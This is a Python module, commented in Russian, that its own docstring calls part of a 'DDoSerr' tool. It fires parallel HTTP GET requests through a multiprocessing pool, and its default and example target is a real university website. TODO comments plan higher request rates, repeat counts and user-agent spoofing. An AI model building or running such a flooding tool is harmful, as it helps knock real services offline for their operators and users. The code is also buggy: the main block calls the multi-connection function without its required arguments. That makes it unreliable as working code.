#!/usr/bin/python3
#Путь к интерпретатору пайтона.
# -*- coding: utf-8 -*-
#Выбор кодировки (без него не работает русский язык).

"""
Модуль отправки HTTP-запросов для DDoSerr.
v.1.3.2 от 05.07.2018.
"""

"""
Легенда обозначений:
"___" - переделать / удалить;
"---" - отладка;
"~~~" - сделать;
"!" - первоочередная задача.
"""

#Используем библиотеку requests.
import requests
#Подключаем модуль многопроцессорности и многопоточности, а точнее,
#функцию Pool.
from multiprocessing import Pool

def http_connection(url="http://127.0.0.1"):
    """
    Функция для создания одного запроса к сайту и получения ответа.
    Если не задаётся url, то стучится в localhost.
    """
    #https://httpbin.org/get
    #Если не задаётся извне значение url, то берётся указанное.
    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    #!Позже добавить в аргументы user_agent!
    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    request = requests.get(url)
    #Для post запросов пригодится в будущем.
    #request = requests.post("http://httpbin.org/post")
    
    status = request.status_code
    print(status)
    head = request.headers['content-type']
    print(head)
    
    return(status, head)
    
    
    """
    СДЕЛАНО.
    Есть функция http_connection, вызывающая одно соединение.
    Надо сделать функцию http_multiconnection, вызывающую несколько
    соединений в своих процессах.
    В основной программе вместо вызова http_connection 
    вызывать http_multiconnection.
    """
    
def http_multiconnection(speed, pause, url="https://www.vsu.ru"):
    
    """
    Реализация многопоточности.
    #Получается 4 процесса: один родительский и 3 дочерних.
    """
    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    #Сделать настройку url (из конфига и ком. строки).
    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    
    #!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    #!Сделать настройку количества процессов!
    #(Добавить в принимаемые аргументы.)
    proc = speed
    #!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    #Создаём пул из 'proc' штук работников (процессов).
    pool = Pool(processes=proc)
    #Даём им задание по одному (поэтому в цикле) и получаем результат.
    for _ in range(proc):
        result = pool.apply_async(http_connection, (url,))
    
    #apply_async даёт задачу только одному процессу. Не подходит.
    #result = pool.apply_async(http_connection, ("https://www.vsu.ru",))
    
    #Вывод результата с таймаутом (если вдруг будет работать слишком долго).
    print(result.get(timeout=1))
    return(result)
    
    """
    !~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Передать сюда количество повторений (настоящий repeat)
    и количество запросов в секунду speed (пока сделать speed = 1).
    
    В одном процессе надо сделать много запросов.
    
    СДЕЛАНО - Переименовать repeat, т.к. это не количество повторов запросов,
    а количество запросов в секунду (speed).
    
    !Сделать количество повторов вызова функции - настоящий repeat.
    !~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    """
    
    
"""
То, что находится внутри if __name__ == "__main__" будет выполнено 
только в том случае, когда модуль запущен отдельно, а не импортирован. 
"""
if __name__ == "__main__":
    """
    Реализация многопоточности для самостоятельного запуска модуля.
    Хорошо работает.
    #Получается 4 процесса: один родительский и 3 дочерних.
    
    
    #Создаём пул из 3-х работников (процессов).
    pool = Pool(processes=3)
    #Задаём набор параметров для задания (по количеству процессов + 1). 
    #Пока что вручную.
    urls = ["https://www.vsu.ru", "https://www.vsu.ru", "https://www.vsu.ru", "https://www.vsu.ru"]
    #Даём им задание и получаем результат.
    result = pool.map_async(http_connection, urls)
    
    #apply_async даёт задачу только одному процессу. Не подходит.
    #result = pool.apply_async(http_connection, ("https://www.vsu.ru",))
    
    #Вывод результата с таймаутом (если вдруг будет работать слишком долго).
    print(result.get(timeout=1))
    """
    
    #Запуск функции.
    #http_connection()
    http_multiconnection()
